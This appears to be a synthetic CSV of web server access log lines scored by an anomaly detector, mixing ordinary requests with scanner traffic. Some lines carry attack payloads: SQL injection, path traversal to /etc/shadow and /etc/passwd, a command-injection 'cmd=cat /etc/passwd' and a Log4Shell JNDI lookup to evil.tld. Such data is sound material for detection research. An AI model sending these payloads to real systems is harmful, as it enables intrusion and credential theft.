score_content,score_session,score_fused,score_fused_norm,line
27.7712459564209,,27.7712459564209,27.7712459564209,137.158.218.238 - - [10/Jan/2025:12:24:05 +0000] "DELETE /admin HTTP/1.1" 200 16782 "https://example.com/" "nikto/2.5.0"
3.064026117324829,,3.064026117324829,3.064026117324829,184.171.167.24 - - [10/Jan/2025:12:24:06 +0000] "GET /assets/app.js HTTP/1.1" 304 13408 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
39.06692886352539,,39.06692886352539,39.06692886352539,200.167.251.10 - - [10/Jan/2025:12:24:06 +0000] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 302 12471 "https://www.google.com/" "nikto/2.5.0"
73.40390014648438,,73.40390014648438,73.40390014648438,95.186.254.164 - - [10/Jan/2025:12:24:07 +0000] "HEAD /api/backup?file=../../../../etc/shadow HTTP/1.1" 301 5521 "-" "python-requests/2.31.0"
0.306439608335495,,0.306439608335495,0.306439608335495,209.98.207.237 - - [10/Jan/2025:12:24:10 +0000] "GET /index.html HTTP/1.1" 200 12731 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
27.657068252563477,,27.657068252563477,27.657068252563477,176.225.242.243 - - [10/Jan/2025:12:24:10 +0000] "DELETE /profile HTTP/1.1" 200 2918 "https://example.com/" "sqlmap/1.7.2#stable"
27.704986572265625,,27.704986572265625,27.704986572265625,78.184.99.7 - - [10/Jan/2025:12:24:13 +0000] "DELETE /contact HTTP/1.1" 200 17803 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
24.785429000854492,,24.785429000854492,24.785429000854492,7.152.189.152 - - [10/Jan/2025:12:24:14 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12595 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
3.110089063644409,,3.110089063644409,3.110089063644409,69.76.166.206 - - [10/Jan/2025:12:24:15 +0000] "GET /index.html HTTP/1.1" 304 4780 "-" "curl/7.85.0"
27.670591354370117,,27.670591354370117,27.670591354370117,79.226.98.16 - - [10/Jan/2025:12:24:15 +0000] "POST /search?q=ssd HTTP/1.1" 200 11266 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30149.08203125,,30149.08203125,30149.08203125,250.169.210.211 - - [10/Jan/2025:12:24:16 +0000] "DELETE /profile HTTP/1.1" 401 1458 "https://twitter.com/" "dirb/2.22"
30121.9453125,,30121.9453125,30121.9453125,79.108.221.230 - - [10/Jan/2025:12:24:17 +0000] "GET /assets/app.css HTTP/1.1" 401 1071 "https://news.ycombinator.com/" "python-requests/2.31.0"
30217.0859375,,30217.0859375,30217.0859375,31.135.13.20 - - [10/Jan/2025:12:24:20 +0000] "OPTIONS /search?q=ssd HTTP/1.1" 403 238 "https://example.com/" "python-requests/2.31.0"
53.38636779785156,,53.38636779785156,53.38636779785156,150.53.56.183 - - [10/Jan/2025:12:24:21 +0000] "DELETE /api/user?id=1;DROP TABLE users HTTP/1.1" 304 2828 "-" "nikto/2.5.0"
30122.1953125,,30122.1953125,30122.1953125,90.165.211.26 - - [10/Jan/2025:12:24:23 +0000] "GET /index.html HTTP/1.1" 400 43 "https://news.ycombinator.com/" "python-requests/2.31.0"
104.85327911376953,,104.85327911376953,104.85327911376953,191.65.67.44 - - [10/Jan/2025:12:24:23 +0000] "TRACE /logout HTTP/1.1" 200 1975 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.64600372314453,,27.64600372314453,27.64600372314453,22.58.51.90 - - [10/Jan/2025:12:24:25 +0000] "POST /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 18118 "https://example.com/" "nikto/2.5.0"
30.410015106201172,,30.410015106201172,30.410015106201172,133.54.236.192 - - [10/Jan/2025:12:24:27 +0000] "DELETE /dashboard HTTP/1.1" 301 15789 "https://example.com/" "python-requests/2.31.0"
104.940673828125,,104.940673828125,104.940673828125,186.35.87.194 - - [10/Jan/2025:12:24:30 +0000] "TRACE /about HTTP/1.1" 200 19305 "https://www.google.com/" "curl/7.85.0"
104.8582763671875,,104.8582763671875,104.8582763671875,126.243.220.164 - - [10/Jan/2025:12:24:32 +0000] "TRACE /contact HTTP/1.1" 200 14359 "https://twitter.com/" "nikto/2.5.0"
70.49591064453125,,70.49591064453125,70.49591064453125,189.249.39.184 - - [10/Jan/2025:12:24:32 +0000] "HEAD /search?q=camera HTTP/1.1" 200 1401 "https://www.google.com/" "curl/7.85.0"
36.21150588989258,,36.21150588989258,36.21150588989258,212.124.96.193 - - [10/Jan/2025:12:24:33 +0000] "PUT /search?q=router HTTP/1.1" 200 14588 "https://twitter.com/" "curl/7.85.0"
1.9077204465866089,,1.9077204465866089,1.9077204465866089,193.229.44.21 - - [10/Jan/2025:12:24:34 +0000] "GET /profile HTTP/1.1" 201 15320 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.8031005859375,,24.8031005859375,24.8031005859375,179.97.189.9 - - [10/Jan/2025:12:24:34 +0000] "GET /api/product?id=123 HTTP/1.1" 200 18815 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
104.68280792236328,,104.68280792236328,104.68280792236328,212.194.174.210 - - [10/Jan/2025:12:24:36 +0000] "TRACE /server-status HTTP/1.1" 200 11283 "https://news.ycombinator.com/" "python-requests/2.31.0"
50.419429779052734,,50.419429779052734,50.419429779052734,202.220.220.235 - - [10/Jan/2025:12:24:38 +0000] "DELETE /search?q=headphones HTTP/1.1" 200 1159 "-" "Wget/1.21.2 (linux-gnu)"
13.483014106750488,,13.483014106750488,13.483014106750488,39.137.23.158 - - [10/Jan/2025:12:24:38 +0000] "PUT /logout HTTP/1.1" 200 129 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
3.050834894180298,,3.050834894180298,3.050834894180298,108.58.215.252 - - [10/Jan/2025:12:24:40 +0000] "POST /cgi-bin/test.cgi HTTP/1.1" 200 10148 "https://www.google.com/" "curl/7.85.0"
36.17458724975586,,36.17458724975586,36.17458724975586,219.245.104.137 - - [10/Jan/2025:12:24:43 +0000] "PUT /search?q=monitor HTTP/1.1" 201 572 "-" "nikto/2.5.0"
127.69237518310547,,127.69237518310547,127.69237518310547,30.138.150.200 - - [10/Jan/2025:12:24:44 +0000] "TRACE /search?q=laptop HTTP/1.1" 200 15509 "https://example.com/" "sqlmap/1.7.2#stable"
104.89501190185547,,104.89501190185547,104.89501190185547,224.132.222.130 - - [10/Jan/2025:12:24:44 +0000] "TRACE /logout HTTP/1.1" 200 15451 "-" "nikto/2.5.0"
36.237464904785156,,36.237464904785156,36.237464904785156,25.194.2.117 - - [10/Jan/2025:12:24:46 +0000] "PUT /search?q=ssd HTTP/1.1" 200 2511 "https://twitter.com/" "nikto/2.5.0"
30126.900390625,,30126.900390625,30126.900390625,229.206.14.229 - - [10/Jan/2025:12:24:46 +0000] "POST /login HTTP/1.1" 404 128 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.17473699152469635,,0.17473699152469635,0.17473699152469635,134.125.171.7 - - [10/Jan/2025:12:24:48 +0000] "GET /assets/app.css HTTP/1.1" 201 1619 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.17516697943210602,,0.17516697943210602,0.17516697943210602,25.45.175.84 - - [10/Jan/2025:12:24:50 +0000] "GET /assets/app.css HTTP/1.1" 200 2639 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
47.736392974853516,,47.736392974853516,47.736392974853516,141.68.49.184 - - [10/Jan/2025:12:24:51 +0000] "HEAD /about HTTP/1.1" 201 3341 "-" "python-requests/2.31.0"
0.2357061505317688,,0.2357061505317688,0.2357061505317688,228.170.109.75 - - [10/Jan/2025:12:24:54 +0000] "GET /assets/app.js HTTP/1.1" 200 14425 "https://news.ycombinator.com/" "curl/7.85.0"
70.52249145507812,,70.52249145507812,70.52249145507812,218.237.205.225 - - [10/Jan/2025:12:24:57 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 11229 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.0284371376037598,,3.0284371376037598,3.0284371376037598,190.168.60.60 - - [10/Jan/2025:12:24:59 +0000] "GET /assets/app.js HTTP/1.1" 302 15087 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
96.23664093017578,,96.23664093017578,96.23664093017578,199.163.213.51 - - [10/Jan/2025:12:25:01 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 200 7873 "https://twitter.com/" "dirb/2.22"
13.351487159729004,,13.351487159729004,13.351487159729004,186.91.80.78 - - [10/Jan/2025:12:25:02 +0000] "PUT /api/products HTTP/1.1" 200 10782 "-" "python-requests/2.31.0"
27.579328536987305,,27.579328536987305,27.579328536987305,122.117.176.243 - - [10/Jan/2025:12:25:04 +0000] "POST /search?q=router HTTP/1.1" 200 4029 "https://example.com/" "dirb/2.22"
70.44013214111328,,70.44013214111328,70.44013214111328,139.151.89.112 - - [10/Jan/2025:12:25:04 +0000] "HEAD /search?q=headphones HTTP/1.1" 200 5899 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
47.7012825012207,,47.7012825012207,47.7012825012207,70.134.110.188 - - [10/Jan/2025:12:25:07 +0000] "HEAD /logout HTTP/1.1" 200 2474 "https://example.com/" "python-requests/2.31.0"
36.206729888916016,,36.206729888916016,36.206729888916016,34.97.15.219 - - [10/Jan/2025:12:25:09 +0000] "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 789 "https://twitter.com/" "dirb/2.22"
27.70213508605957,,27.70213508605957,27.70213508605957,121.238.116.195 - - [10/Jan/2025:12:25:11 +0000] "POST /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 6073 "https://www.google.com/" "curl/7.85.0"
27.600255966186523,,27.600255966186523,27.600255966186523,149.212.222.225 - - [10/Jan/2025:12:25:14 +0000] "POST /search?q=router HTTP/1.1" 200 9867 "https://news.ycombinator.com/" "dirb/2.22"
30135.29296875,,30135.29296875,30135.29296875,33.212.168.82 - - [10/Jan/2025:12:25:17 +0000] "PUT /contact HTTP/1.1" 404 1238 "https://example.com/" "sqlmap/1.7.2#stable"
0.20210649073123932,,0.20210649073123932,0.20210649073123932,34.124.43.129 - - [10/Jan/2025:12:25:18 +0000] "GET /assets/app.css HTTP/1.1" 200 10689 "https://twitter.com/" "nikto/2.5.0"
27.772441864013672,,27.772441864013672,27.772441864013672,164.50.136.200 - - [10/Jan/2025:12:25:19 +0000] "DELETE /about HTTP/1.1" 200 17221 "https://twitter.com/" "nikto/2.5.0"
2.1609385013580322,,2.1609385013580322,2.1609385013580322,102.124.194.122 - - [10/Jan/2025:12:25:21 +0000] "GET / HTTP/1.1" 200 9117 "https://news.ycombinator.com/" "nikto/2.5.0"
36.1129264831543,,36.1129264831543,36.1129264831543,83.130.144.92 - - [10/Jan/2025:12:25:23 +0000] "PUT /search?q=headphones HTTP/1.1" 200 4252 "https://www.google.com/" "sqlmap/1.7.2#stable"
27.668107986450195,,27.668107986450195,27.668107986450195,14.40.51.164 - - [10/Jan/2025:12:25:26 +0000] "DELETE /api/products HTTP/1.1" 200 15068 "https://www.google.com/" "curl/7.85.0"
73.42306518554688,,73.42306518554688,73.42306518554688,98.141.161.38 - - [10/Jan/2025:12:25:28 +0000] "OPTIONS /logout HTTP/1.1" 200 2783 "https://example.com/" "dirb/2.22"
0.1795097291469574,,0.1795097291469574,0.1795097291469574,199.194.109.209 - - [10/Jan/2025:12:25:31 +0000] "GET /assets/app.css HTTP/1.1" 200 1238 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
107.6330795288086,,107.6330795288086,107.6330795288086,2.186.95.80 - - [10/Jan/2025:12:25:34 +0000] "TRACE /api/products HTTP/1.1" 304 924 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2169293314218521,,0.2169293314218521,0.2169293314218521,108.15.224.21 - - [10/Jan/2025:12:25:34 +0000] "GET /assets/app.css HTTP/1.1" 200 15511 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
7.665794372558594,,7.665794372558594,7.665794372558594,204.81.104.183 - - [10/Jan/2025:12:25:37 +0000] "POST /login HTTP/1.1" 302 18059 "https://www.google.com/" "python-requests/2.31.0"
30225.123046875,,30225.123046875,30225.123046875,191.135.175.57 - - [10/Jan/2025:12:25:38 +0000] "TRACE /about HTTP/1.1" 401 1385 "https://news.ycombinator.com/" "curl/7.85.0"
0.177006334066391,,0.177006334066391,0.177006334066391,195.189.81.33 - - [10/Jan/2025:12:25:40 +0000] "GET /assets/app.css HTTP/1.1" 200 3521 "https://news.ycombinator.com/" "python-requests/2.31.0"
96.24694061279297,,96.24694061279297,96.24694061279297,101.166.118.11 - - [10/Jan/2025:12:25:42 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 200 10792 "https://example.com/" "sqlmap/1.7.2#stable"
2.1796493530273438,,2.1796493530273438,2.1796493530273438,65.28.24.247 - - [10/Jan/2025:12:25:45 +0000] "GET / HTTP/1.1" 200 14996 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
50.70362854003906,,50.70362854003906,50.70362854003906,100.143.248.198 - - [10/Jan/2025:12:25:48 +0000] "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 16422 "-" "python-requests/2.31.0"
50.52695083618164,,50.52695083618164,50.52695083618164,212.61.43.98 - - [10/Jan/2025:12:25:48 +0000] "DELETE /search?q=camera HTTP/1.1" 200 18193 "https://twitter.com/" "dirb/2.22"
2.1577343940734863,,2.1577343940734863,2.1577343940734863,164.200.93.251 - - [10/Jan/2025:12:25:49 +0000] "GET / HTTP/1.1" 200 8211 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30146.88671875,,30146.88671875,30146.88671875,238.92.241.32 - - [10/Jan/2025:12:25:49 +0000] "GET /search?q=headphones HTTP/1.1" 401 24 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30122.0703125,,30122.0703125,30122.0703125,82.162.90.239 - - [10/Jan/2025:12:25:49 +0000] "GET /assets/app.css HTTP/1.1" 404 1353 "https://twitter.com/" "curl/7.85.0"
36.25809097290039,,36.25809097290039,36.25809097290039,193.150.205.173 - - [10/Jan/2025:12:25:50 +0000] "PUT /search?q=ssd HTTP/1.1" 204 10406 "https://www.google.com/" "nikto/2.5.0"
4.901304721832275,,4.901304721832275,4.901304721832275,43.17.91.203 - - [10/Jan/2025:12:25:50 +0000] "POST /about HTTP/1.1" 204 165 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
47.63877868652344,,47.63877868652344,47.63877868652344,58.27.22.189 - - [10/Jan/2025:12:25:51 +0000] "HEAD /api/products HTTP/1.1" 200 2877 "-" "dirb/2.22"
96.3150405883789,,96.3150405883789,96.3150405883789,17.81.232.35 - - [10/Jan/2025:12:25:53 +0000] "OPTIONS /search?q=ssd HTTP/1.1" 200 11687 "https://news.ycombinator.com/" "python-requests/2.31.0"
70.67894744873047,,70.67894744873047,70.67894744873047,110.144.243.18 - - [10/Jan/2025:12:25:56 +0000] "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 1190 "https://twitter.com/" "curl/7.85.0"
36.28733444213867,,36.28733444213867,36.28733444213867,109.77.224.93 - - [10/Jan/2025:12:25:58 +0000] "PUT /search?q=ssd HTTP/1.1" 200 18393 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
1.9169009923934937,,1.9169009923934937,1.9169009923934937,203.234.198.117 - - [10/Jan/2025:12:26:01 +0000] "GET /logout HTTP/1.1" 200 7277 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.7026206254959106,,1.7026206254959106,1.7026206254959106,33.190.126.246 - - [10/Jan/2025:12:26:01 +0000] "GET /server-status HTTP/1.1" 201 3895 "https://news.ycombinator.com/" "curl/7.85.0"
2.1440160274505615,,2.1440160274505615,2.1440160274505615,119.1.141.154 - - [10/Jan/2025:12:26:04 +0000] "GET / HTTP/1.1" 204 5986 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
73.46356964111328,,73.46356964111328,73.46356964111328,121.188.195.208 - - [10/Jan/2025:12:26:04 +0000] "OPTIONS /login HTTP/1.1" 200 4634 "https://example.com/" "sqlmap/1.7.2#stable"
27.720495223999023,,27.720495223999023,27.720495223999023,35.141.215.84 - - [10/Jan/2025:12:26:06 +0000] "POST /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 11260 "https://news.ycombinator.com/" "dirb/2.22"
0.18729223310947418,,0.18729223310947418,0.18729223310947418,41.185.78.57 - - [10/Jan/2025:12:26:08 +0000] "GET /assets/app.css HTTP/1.1" 200 6491 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.1915948390960693,,2.1915948390960693,2.1915948390960693,104.129.201.250 - - [10/Jan/2025:12:26:11 +0000] "GET / HTTP/1.1" 200 19403 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
47.74183654785156,,47.74183654785156,47.74183654785156,145.169.188.3 - - [10/Jan/2025:12:26:14 +0000] "HEAD /logout HTTP/1.1" 200 14961 "-" "curl/7.85.0"
13.328592300415039,,13.328592300415039,13.328592300415039,104.51.124.162 - - [10/Jan/2025:12:26:16 +0000] "PUT /dashboard HTTP/1.1" 204 15883 "-" "Wget/1.21.2 (linux-gnu)"
30135.16796875,,30135.16796875,30135.16796875,223.213.190.205 - - [10/Jan/2025:12:26:17 +0000] "PUT /api/products HTTP/1.1" 403 1348 "https://www.google.com/" "dirb/2.22"
0.29837438464164734,,0.29837438464164734,0.29837438464164734,66.80.113.113 - - [10/Jan/2025:12:26:19 +0000] "GET /.git/config HTTP/1.1" 200 19473 "https://example.com/" "python-requests/2.31.0"
127.54644012451172,,127.54644012451172,127.54644012451172,74.214.178.24 - - [10/Jan/2025:12:26:20 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 1625 "https://example.com/" "python-requests/2.31.0"
1.8821079730987549,,1.8821079730987549,1.8821079730987549,167.94.244.7 - - [10/Jan/2025:12:26:23 +0000] "GET /contact HTTP/1.1" 200 6975 "https://news.ycombinator.com/" "python-requests/2.31.0"
127.76089477539062,,127.76089477539062,127.76089477539062,195.41.7.215 - - [10/Jan/2025:12:26:24 +0000] "TRACE /api/product?id=123 HTTP/1.1" 200 17677 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.7439559698104858,,1.7439559698104858,1.7439559698104858,16.173.105.246 - - [10/Jan/2025:12:26:27 +0000] "GET /server-status HTTP/1.1" 200 15780 "https://news.ycombinator.com/" "python-requests/2.31.0"
38.94559097290039,,38.94559097290039,38.94559097290039,187.188.198.82 - - [10/Jan/2025:12:26:28 +0000] "PUT /search?q=monitor HTTP/1.1" 301 6472 "https://news.ycombinator.com/" "python-requests/2.31.0"
70.5137710571289,,70.5137710571289,70.5137710571289,219.56.160.183 - - [10/Jan/2025:12:26:28 +0000] "HEAD /search?q=phone HTTP/1.1" 200 2853 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.810347080230713,,4.810347080230713,4.810347080230713,227.85.119.90 - - [10/Jan/2025:12:26:31 +0000] "POST /profile HTTP/1.1" 200 19641 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
96.17217254638672,,96.17217254638672,96.17217254638672,68.67.48.199 - - [10/Jan/2025:12:26:32 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 200 7553 "-" "sqlmap/1.7.2#stable"
70.44981384277344,,70.44981384277344,70.44981384277344,22.218.58.134 - - [10/Jan/2025:12:26:33 +0000] "HEAD /search?q=headphones HTTP/1.1" 200 8527 "https://example.com/" "curl/7.85.0"
30.392353057861328,,30.392353057861328,30.392353057861328,116.105.182.224 - - [10/Jan/2025:12:26:34 +0000] "POST /search?q=phone HTTP/1.1" 302 3149 "https://twitter.com/" "sqlmap/1.7.2#stable"
70.53148651123047,,70.53148651123047,70.53148651123047,205.248.111.120 - - [10/Jan/2025:12:26:34 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 14099 "-" "sqlmap/1.7.2#stable"
36.261959075927734,,36.261959075927734,36.261959075927734,33.170.142.92 - - [10/Jan/2025:12:26:35 +0000] "PUT /search?q=ssd HTTP/1.1" 200 9900 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
30168.716796875,,30168.716796875,30168.716796875,176.60.43.181 - - [10/Jan/2025:12:26:35 +0000] "HEAD /contact HTTP/1.1" 401 187 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
96.2448501586914,,96.2448501586914,96.2448501586914,179.180.116.67 - - [10/Jan/2025:12:26:35 +0000] "OPTIONS /search?q=camera HTTP/1.1" 200 10183 "-" "curl/7.85.0"
36.12344741821289,,36.12344741821289,36.12344741821289,66.113.8.75 - - [10/Jan/2025:12:26:36 +0000] "PUT /search?q=headphones HTTP/1.1" 200 7158 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
4.8275370597839355,,4.8275370597839355,4.8275370597839355,24.139.140.86 - - [10/Jan/2025:12:26:39 +0000] "POST /logout HTTP/1.1" 200 13660 "-" "sqlmap/1.7.2#stable"
36.17454147338867,,36.17454147338867,36.17454147338867,252.235.137.102 - - [10/Jan/2025:12:26:42 +0000] "PUT /search?q=monitor HTTP/1.1" 200 8822 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
5.894587993621826,,5.894587993621826,5.894587993621826,177.134.219.162 - - [10/Jan/2025:12:26:44 +0000] "POST /../../etc/passwd HTTP/1.1" 304 13975 "https://twitter.com/" "nikto/2.5.0"
30216.880859375,,30216.880859375,30216.880859375,176.24.164.184 - - [10/Jan/2025:12:26:45 +0000] "OPTIONS /search?q=router HTTP/1.1" 401 777 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
104.79010772705078,,104.79010772705078,104.79010772705078,201.252.53.188 - - [10/Jan/2025:12:26:48 +0000] "TRACE /api/products HTTP/1.1" 200 2265 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
107.61193084716797,,107.61193084716797,107.61193084716797,21.69.251.48 - - [10/Jan/2025:12:26:50 +0000] "TRACE /contact HTTP/1.1" 301 8422 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
73.37476348876953,,73.37476348876953,73.37476348876953,136.8.195.188 - - [10/Jan/2025:12:26:53 +0000] "OPTIONS /dashboard HTTP/1.1" 200 17575 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
127.68944549560547,,127.68944549560547,127.68944549560547,38.199.246.46 - - [10/Jan/2025:12:26:55 +0000] "TRACE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 7922 "https://twitter.com/" "curl/7.85.0"
2.9739327430725098,,2.9739327430725098,2.9739327430725098,32.60.20.22 - - [10/Jan/2025:12:26:55 +0000] "GET /assets/app.css HTTP/1.1" 302 5366 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
73.38928985595703,,73.38928985595703,73.38928985595703,64.67.111.100 - - [10/Jan/2025:12:26:56 +0000] "OPTIONS /contact HTTP/1.1" 200 2654 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
73.3324966430664,,73.3324966430664,73.3324966430664,38.152.19.14 - - [10/Jan/2025:12:26:56 +0000] "OPTIONS /dashboard HTTP/1.1" 200 4613 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.1733131408691406,,3.1733131408691406,3.1733131408691406,165.91.159.52 - - [10/Jan/2025:12:26:56 +0000] "POST /.git/config HTTP/1.1" 200 14213 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
0.2211105227470398,,0.2211105227470398,0.2211105227470398,235.23.44.111 - - [10/Jan/2025:12:26:58 +0000] "GET /wp-login.php HTTP/1.1" 200 2918 "https://www.google.com/" "sqlmap/1.7.2#stable"
73.50717163085938,,73.50717163085938,73.50717163085938,215.230.229.174 - - [10/Jan/2025:12:27:01 +0000] "OPTIONS /login HTTP/1.1" 200 18105 "https://news.ycombinator.com/" "curl/7.85.0"
70.49850463867188,,70.49850463867188,70.49850463867188,99.39.75.6 - - [10/Jan/2025:12:27:02 +0000] "HEAD /search?q=camera HTTP/1.1" 200 4516 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
45.94016647338867,,45.94016647338867,45.94016647338867,7.147.19.88 - - [10/Jan/2025:12:27:02 +0000] "HEAD /../../etc/passwd HTTP/1.1" 200 3847 "-" "nikto/2.5.0"
27.745677947998047,,27.745677947998047,27.745677947998047,146.173.34.73 - - [10/Jan/2025:12:27:05 +0000] "DELETE /logout HTTP/1.1" 200 257 "https://twitter.com/" "sqlmap/1.7.2#stable"
30126.66796875,,30126.66796875,30126.66796875,42.147.24.52 - - [10/Jan/2025:12:27:07 +0000] "POST /about HTTP/1.1" 401 1444 "-" "nikto/2.5.0"
73.45854949951172,,73.45854949951172,73.45854949951172,158.208.180.111 - - [10/Jan/2025:12:27:10 +0000] "OPTIONS /logout HTTP/1.1" 200 13396 "https://twitter.com/" "curl/7.85.0"
127.58759307861328,,127.58759307861328,127.58759307861328,32.176.72.212 - - [10/Jan/2025:12:27:11 +0000] "TRACE /search?q=headphones HTTP/1.1" 200 3156 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
30123.7421875,,30123.7421875,30123.7421875,170.113.217.94 - - [10/Jan/2025:12:27:14 +0000] "GET /login HTTP/1.1" 403 793 "https://www.google.com/" "curl/7.85.0"
2.1741979122161865,,2.1741979122161865,2.1741979122161865,197.44.5.3 - - [10/Jan/2025:12:27:17 +0000] "GET / HTTP/1.1" 200 406 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
